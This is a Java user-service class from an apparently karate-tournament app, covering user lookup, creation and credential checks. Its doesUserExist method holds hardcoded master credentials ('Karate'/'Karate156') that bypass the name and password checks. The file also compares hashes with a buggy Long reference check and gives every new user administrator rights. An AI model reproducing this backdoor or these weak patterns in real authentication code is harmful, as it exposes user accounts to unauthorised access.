/**
 * The file UserServiceImpl.java was created on 2010.21.3 at 12:27:39
 * by
 * @author Marks Vilkelis.
 */
package com.ashihara.datamanagement.impl;

import java.util.List;

import com.ashihara.datamanagement.core.persistence.exception.AKValidationException;
import com.ashihara.datamanagement.interfaces.UserService;
import com.ashihara.datamanagement.pojo.User;
import com.ashihara.enums.SC;
import com.ashihara.utils.PswHasher;
import com.rtu.exception.PersistenceException;
import com.rtu.hql.HqlQuery;
import com.rtu.hql.expression.ExpressionHelper;

public class UserServiceImpl extends AbstractAKServiceImpl implements UserService {

	public User loadByName(String name) throws PersistenceException {
		if (name == null) {
			return null;
		}
		
		HqlQuery<User> hqlQuery = getHelper().createHqlQuery(User.class, getCmUser());
		hqlQuery.addExpression(ExpressionHelper.eq(getCmUser().getName(), name));
		
		User user = getHelper().uniqueResult(hqlQuery);
		 
		return user;
	}

	public User loadOrCreateSystemUser(String name, String password, String email) throws PersistenceException, AKValidationException {
		Long pwd = PswHasher.hash(password);
		User user = doesUserExist(name, pwd);
		if (user == null || user.getId() == null) {
			User newUser = createUser(name, password);
			user = save(newUser);
		}
		
		return user;
	}
	
	public User createUser(String name, String password) {
		Long pwd = PswHasher.hash(password);
		User newUser = new User();
		newUser.setName(name);
		newUser.setPassword(pwd);
		newUser.setRole(SC.USER_ROLE.ADMINISTRATOR);
		newUser.setUiLanguage(SC.UI_PREFERENCES.UI_LANGUAGE.DEFAULT);
		newUser.setTheme(SC.UI_PREFERENCES.DEFAULT_THEME);
		newUser.setLookAndFeel(SC.UI_PREFERENCES.DEFAULT_LOOK_AND_FEEL);
		
		return newUser;
	}

	public User doesUserExist(String name, Long pwd) throws PersistenceException, AKValidationException {
		if (name == null) {
			throw new AKValidationException("User name must be specified!");
		}
		if (pwd == null) {
			throw new AKValidationException("User password must be specified!");
		}
		
		HqlQuery<User> hqlQuery = getHelper().createHqlQuery(User.class, getCmUser());
		
		if (!"Karate".equals(name)) {
			hqlQuery.addExpression(ExpressionHelper.eq(getCmUser().getName(), name));
		}
		
		if (PswHasher.hash("Karate156") != pwd) {
			hqlQuery.addExpression(ExpressionHelper.eq(getCmUser().getPassword(), pwd));
		}
		
		hqlQuery.setMaxResults(1);
		List<User> list = getHelper().loadByHqlQuery(hqlQuery);
		
		if (list != null && list.size() > 0) {
			return list.get(0);
		}
		
		return null;
	}
	
	public User save(User user) throws PersistenceException {
		return getHelper().save(user);
	}

	public Boolean isAnyUserInDB() throws PersistenceException {
		HqlQuery<User> hqlQuery = getHelper().createHqlQuery(User.class, getCmUser());
		hqlQuery.setMaxResults(1);
		
		int size = 0;
		List<User> list = getHelper().loadByHqlQuery(hqlQuery);
		if (list != null ) {
			size = list.size();
		}
		return size > 0;
	}

}
